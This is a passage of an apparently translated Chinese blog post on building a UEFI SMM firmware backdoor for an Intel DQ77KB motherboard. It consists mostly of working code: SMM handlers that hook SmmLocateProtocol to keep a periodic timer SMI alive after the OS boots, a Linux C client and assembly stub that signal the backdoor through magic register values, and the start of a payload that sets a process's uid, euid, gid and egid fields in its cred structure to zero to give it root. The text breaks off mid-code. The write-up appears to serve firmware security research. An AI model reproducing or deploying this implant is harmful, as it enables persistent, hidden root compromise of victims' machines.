Status);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//--------------------------------------------------------------------------------------</span></span><br><span class="line">EFI_STATUS EFIAPI <span class="title function_">PeriodicTimerDispatch2ProtocolNotifyHandler</span><span class="params">(</span></span><br><span class="line"><span class="params">    CONST EFI_GUID *Protocol, </span></span><br><span class="line"><span class="params">    VOID *Interface, </span></span><br><span class="line"><span class="params">    EFI_HANDLE Handle)</span></span><br><span class="line">&#123;</span><br><span class="line">    EFI_STATUS Status = EFI_SUCCESS;   </span><br><span class="line">    UINT64 *SmiTickInterval = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取目标协议</span></span><br><span class="line">    m_PeriodicTimerDispatch = </span><br><span class="line">        (EFI_SMM_PERIODIC_TIMER_DISPATCH2_PROTOCOL *)Interface;   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 启用periodic timer SMI</span></span><br><span class="line">    PeriodicTimerDispatch2Register(m_PeriodicTimerDispatchHandle);       </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> EFI_SUCCESS;   </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//--------------------------------------------------------------------------------------</span></span><br><span class="line">VOID <span class="title function_">BackdoorEntrySmm</span><span class="params">(VOID)</span></span><br><span class="line">&#123;</span><br><span class="line">    PVOID Registration = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... skipped ...</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 注册 SMM 协议信息</span></span><br><span class="line">    EFI_STATUS Status = gSmst-&gt;SmmRegisterProtocolNotify(</span><br><span class="line">        &amp;gEfiSmmPeriodicTimerDispatch2ProtocolGuid, </span><br><span class="line">        PeriodicTimerDispatch2ProtocolNotifyHandler, </span><br><span class="line">        &amp;Registration</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (Status == EFI_SUCCESS)</span><br><span class="line">    &#123;</span><br><span class="line">        DbgMsg(</span><br><span class="line">            __FILE__, __LINE__, <span class="string">&quot;SMM protocol notify handler is at &quot;</span>FPTR<span class="string">&quot;\r\n&quot;</span>,</span><br><span class="line">            PeriodicTimerDispatch2ProtocolNotifyHandler</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        DbgMsg(__FILE__, __LINE__, <span class="string">&quot;RegisterProtocolNotify() fails: 0x%X\r\n&quot;</span>, Status);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... skipped ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>当我第一次在我的主板上运行这个代码时——我发现periodic timer可以初始化并正常工作，但是在操作系统(64位Linux)加载过程中，它会停止生成SMI。这种行为很容易解释：在初期引导期间，OS内核覆盖了APIC控制器配置，显然破坏了由受感染的固件配置的timer。因为没有简单的&#x2F;文档化的方法来保护APIC配置不受操作系统的更改——我们需要找到一种方法，在内核初始化较晚的阶段，从SMM代码重新初始化timer。<br>我花了一些时间来hook并模拟SMST函数，我发现在板载硬件初始化的后期阶段，我的固件代码会调用<code>EFI_SMM_SYSTEM_TABLE2.SmmLocateProtocol()</code>函数来找到GUID &#x3D; <code>3EF7500E-CF55-474F-8E7E009E0EACECD2</code>(<a target="_blank" rel="noopener" href="https://www.google.com/search?q=3ef7500e+cf+55+474+f+8e+7e+00+9e+0e+ac+ec+d2">google</a>说它的内部厂商定义名为<code>AMI_USB_SMM_PROTOCOL_GUID</code>)的协议。因为APIC此时已经被内核初始化了——我实现了hook <code>EFI_SMM_SYSTEM_TABLE2.SmmLocateProtocol()</code>的后门代码，并在hook处理函数内重新安装我们的periodic timer：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> AMI_USB_SMM_PROTOCOL_GUID &#123; 0x3ef7500e, 0xcf55, 0x474f, \</span></span><br><span class="line"><span class="meta">                                    &#123; 0x8e, 0x7e, 0x00, 0x9e, 0x0e, 0xac, 0xec, 0xd2 &#125;&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">EFI_LOCATE_PROTOCOL old_SmmLocateProtocol = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">EFI_STATUS EFIAPI <span class="title function_">new_SmmLocateProtocol</span><span class="params">(</span></span><br><span class="line"><span class="params">    EFI_GUID *Protocol,</span></span><br><span class="line"><span class="params">    VOID *Registration,</span></span><br><span class="line"><span class="params">    VOID **Interface)</span></span><br><span class="line">&#123;        </span><br><span class="line">    EFI_GUID TargetGuid = AMI_USB_SMM_PROTOCOL_GUID;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        完全针对英特尔DQ77KB主板的攻击，</span></span><br><span class="line"><span class="comment">        SmmLocateProtocol 和 AMI_USB_SMM_PROTOCOL_GUID 在APIC初始化后的OS启动过程中被调用</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> (Protocol &amp;&amp; !<span class="built_in">memcmp</span>(Protocol, &amp;TargetGuid, <span class="keyword">sizeof</span>(TargetGuid)))</span><br><span class="line">    &#123;</span><br><span class="line">        DbgMsg(__FILE__, __LINE__, __FUNCTION__<span class="string">&quot;()\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (m_PeriodicTimerDispatchHandle)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 卸载先前注册的timer</span></span><br><span class="line">            PeriodicTimerDispatch2Unregister(m_PeriodicTimerDispatchHandle);</span><br><span class="line">            m_PeriodicTimerDispatchHandle = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 再次启用 periodic timer SMI</span></span><br><span class="line">        PeriodicTimerDispatch2Register(&amp;m_PeriodicTimerDispatchHandle);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 移除钩子</span></span><br><span class="line">        gSmst-&gt;SmmLocateProtocol = old_SmmLocateProtocol;       </span><br><span class="line">    &#125;    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用原始函数</span></span><br><span class="line">    <span class="keyword">return</span> old_SmmLocateProtocol(Protocol, Registration, Interface);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//--------------------------------------------------------------------------------------</span></span><br><span class="line">VOID <span class="title function_">BackdoorEntrySmm</span><span class="params">(VOID)</span></span><br><span class="line">&#123;</span><br><span class="line">    PVOID Registration = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... skipped ...</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// hoot SmmLocateProtocol() SMST函数，在操作系统启动时执行后门代码</span></span><br><span class="line">    old_SmmLocateProtocol = gSmst-&gt;SmmLocateProtocol;</span><br><span class="line">    gSmst-&gt;SmmLocateProtocol = new_SmmLocateProtocol;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... skipped ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>当然，这种只针对指定主板的代码对后门的可靠性并不是很好，但它对平台的稳定性没有影响，而且它的代码一点也不复杂。如果你对如何以可移植的方式来解决这个APIC问题有任何想法，让timer设置在操作系统加载后仍然有效——请让我知道:)<br>这个通信方法的客户端代码是用C和ASM编写的，在跳转到死循环之前，它调用Linux的<code>sched_setaffinity()</code>函数，以确保调度程序会在第一个CPU上运行循环：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 在汇编中实现的外部功能</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">smm_call</span><span class="params">(<span class="type">long</span> code, <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> arg1, <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> arg2)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> ret = <span class="number">0</span>;    </span><br><span class="line">    <span class="type">cpu_set_t</span> mask;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;mask);</span><br><span class="line">    CPU_SET(<span class="number">0</span>, &amp;mask);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 告诉调度程序只在第一个CPU上运行当前进程</span></span><br><span class="line">    ret = sched_setaffinity(<span class="number">0</span>, <span class="keyword">sizeof</span>(mask), &amp;mask);</span><br><span class="line">    <span class="keyword">if</span> (ret != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;sched_setaffinity() ERROR %d\n&quot;</span>, errno);</span><br><span class="line">        <span class="keyword">return</span> errno; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> code = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> arg1 = <span class="number">0</span>, arg2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        从命令行参数解析SMM后门调用的参数。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc &gt;= <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((code = strtol(argv[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">16</span>)) == <span class="number">0</span> &amp;&amp; errno == EINVAL)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;strtol() ERROR %d\n&quot;</span>, errno);</span><br><span class="line">            <span class="keyword">return</span> errno; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc &gt;= <span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((arg1 = strtoull(argv[<span class="number">2</span>], <span class="literal">NULL</span>, <span class="number">16</span>)) == <span class="number">0</span> &amp;&amp; errno == EINVAL)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;strtoull() ERROR %d\n&quot;</span>, errno);</span><br><span class="line">            <span class="keyword">return</span> errno; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc &gt;= <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((arg2 = strtoull(argv[<span class="number">3</span>], <span class="literal">NULL</span>, <span class="number">16</span>)) == <span class="number">0</span> &amp;&amp; errno == EINVAL)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;strtoull() ERROR %d\n&quot;</span>, errno);</span><br><span class="line">            <span class="keyword">return</span> errno; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;Calling SMM backdoor with code = 0x%x and args 0x%llx, 0x%llx...\n&quot;</span>, </span><br><span class="line">        code, arg1, arg2</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">        跳转到死循环以调用SMM后门。</span></span><br><span class="line"><span class="comment">       如果后门不可用 —— 这个函数会一直挂起。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    ret = smm_call(code, arg1, arg2);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Sucess! Status code: 0x%.8x\n&quot;</span>, ret);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>客户端代码的汇编部分：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">BITS 64</span><br><span class="line">GLOBAL smm_call</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;</span><br><span class="line">; 供后门检测的magic值</span><br><span class="line">;</span><br><span class="line">%define R8_VAL 0x4141414141414141</span><br><span class="line">%define R9_VAL 0x4242424242424242</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;</span><br><span class="line">; int smm_call(long code, unsigned long long arg1, unsigned long long arg2)</span><br><span class="line">;</span><br><span class="line">; 向SMM后门发送带有指定代码和参数的控制请求</span><br><span class="line">; </span><br><span class="line">;</span><br><span class="line">; Returns EFI_STATUS of requested operation.</span><br><span class="line">;</span><br><span class="line">smm_call:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    push   rcx</span><br><span class="line">    push   r8</span><br><span class="line">    push   r9</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ; SMI timerhandler检查R8和R9是否有magic值</span><br><span class="line">    mov    r8, R8_VAL</span><br><span class="line">    mov    r9, R9_VAL</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    xor    rax, rax</span><br><span class="line">    dec    rax</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ; 以RCX作为指令地址跳转到循环中</span><br><span class="line">    mov    rcx, _loop</span><br><span class="line">    jmp    rcx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ; 结束地址为修改后的RCX值</span><br><span class="line">    nop</span><br><span class="line">    nop</span><br><span class="line">    nop</span><br><span class="line">    nop</span><br><span class="line">    nop</span><br><span class="line">    nop</span><br><span class="line">    jmp    short _end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_loop:</span><br><span class="line">    ;</span><br><span class="line">    ; 当进程在具有magic寄存器值的死循环中运行时，</span><br><span class="line">    ; 将调用SMI计时器handler。</span><br><span class="line">    ; SMM backdoor使RCX值递减 (--&gt; jmp _end) ，退出循环</span><br><span class="line">    ; SmmCallHandle()的代码和参数将进入RDI和RSI。</span><br><span class="line">    ;</span><br><span class="line">    nop</span><br><span class="line">    jmp    rcx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_end:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    pop    r9</span><br><span class="line">    pop    r8</span><br><span class="line">    pop    rcx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ; SMM后门将状态码返回至RAX寄存器中</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure>


<p>后门在启动时自动periodic timer SMI处理器，但是它 在runtime阶段 可能会要求后门启用或禁用它，使用上面SmmBackdoor.py程序：</p>
<ul>
<li><code>SmmBackdoor.py --timer-enable</code> —— 启用periodic timer SMI</li>
<li><code>SmmBackdoor.py --timer-disable</code> —— 禁用periodic timer SMI</li>
</ul>
<h2 id="更高级的payload示例"><a href="#更高级的payload示例" class="headerlink" title="更高级的payload示例"></a>更高级的payload示例</h2><p>当我们有适用于任何权限级别的SMM通信代码后，我们有理由改进后门并编写payload以接受攻击者的普通用户模式下Linux进程的命令并赋予它root特权。<br>为了获得当前进程的权限级别，Linux使用<code>sys_getuid()</code>、<code>sys_geteuid()</code>、<code>sys_getgid()</code>和<code>sys_getegid()</code>系统调用，让我们以<code>sys_getuid()</code>为例看一下它们的汇编代码:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sys_getuid:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">65 48 8b 04 25 00 c7 00 00     mov %gs:0xc700, %rax      ; get task_struct</span><br><span class="line">48 8b 80 88 03 00 00           mov 0x388(%rax), %rax     ; get task_struct-&gt;cred</span><br><span class="line">8b 40 04                       mov 0x4(%rax), %eax       ; get desired value from cred</span><br><span class="line">c3                             retq</span><br></pre></td></tr></table></figure>


<p>如你所见，内核从GS段获取当前进程的结构地址<code>task_struct</code>，并从<code>task_struct-&gt;cred.uid</code>, <code>task_struct-&gt;cred.euid</code>, <code>task_struct-&gt;cred.gid</code> 和 <code>task_struct-&gt;cred.egid</code>字段获取当前用户和组的信息。<br>要在 SMM后门代码中 修改来自SMIhandler的cred值则需要知道它们的偏移量，这些偏移量可能在不同的构建和Linux内核版本之间发生更改。为了避免大量特定于操作系统的逻辑出现在后门代码中，它从客户端接收<code>sys_getuid()</code>， <code>sys_geteuid()</code>， <code>sys_getgid()</code>和<code>sys_getegid()</code>内核函数的地址，并从它们的二进制代码中提取所需字段的偏移量。要给进程root权限，后门代码只需要设置这些字段的值为0：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line">/* </span><br><span class="line">    从SW SMI或periodic timerhandler调度SMM后门命令。</span><br><span class="line">    Code, Arg1 和 Arg2 通常来自后门客户端设置的CPU寄存器值。</span><br><span class="line">*/</span><br><span class="line">EFI_STATUS SmmCallHandle(UINT64 Code, UINT64 Arg1, UINT64 Arg2, PCONTROL_REGS ControlRegs)</span><br><span class="line">&#123;</span><br><span class="line">    EFI_STATUS Status = EFI_INVALID_PARAMETER;    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    switch (Code)</span><br><span class="line">    &#123;</span><br><span class="line">    case BACKDOOR_PRIVESC:</span><br><span class="line">        &#123;</span><br><span class="line">            UINT64 Addr = 0, GsBase = 0;</span><br><span class="line">            int OffsetTaskStruct = 0, OffsetCred = 0;</span><br><span class="line">            unsigned char OffsetCredVal = 0;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            if (Arg1 == 0)</span><br><span class="line">            &#123;</span><br><span class="line">                DbgMsg(__FILE__, __LINE__, &quot;ERROR: Arg1 must be specified\r\n&quot;);</span><br><span class="line">                </span><br><span class="line">                Status = EFI_INVALID_PARAMETER;</span><br><span class="line">                goto _end;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            // 检查是否启用长模式分页</span><br><span class="line">            if (!Check_IA_32e(ControlRegs))</span><br><span class="line">            &#123;</span><br><span class="line">                DbgMsg(__FILE__, __LINE__, &quot;ERROR: IA-32e paging is not enabled\r\n&quot;);</span><br><span class="line">                </span><br><span class="line">                Status = EFI_INVALID_PARAMETER;</span><br><span class="line">                goto _end;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            DbgMsg(__FILE__, __LINE__, &quot;Syscall address is 0x%llx\r\n&quot;, Arg1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            // 获取系统调用的物理地址</span><br><span class="line">            if ((Status = VirtualToPhysical(Arg1, &amp;Addr, ControlRegs-&gt;Cr3)) == EFI_SUCCESS)</span><br><span class="line">            &#123;                </span><br><span class="line">                /*</span><br><span class="line">                    用户模式程序(smm_call)在1-st参数中传递sys_getuid/euid/gid/egid函数地址，</span><br><span class="line">                    我们需要分析它的代码并得到task_struct、cred和uid/euid/gid/egid字段的偏移量。</span><br><span class="line">                    然后只需要设置字段值为0（root）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                    sys_getuid code as example:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                        mov    %gs:0xc700, %rax   ; get task_struct</span><br><span class="line">                        mov    0x388(%rax), %rax  ; get task_struct-&gt;cred</span><br><span 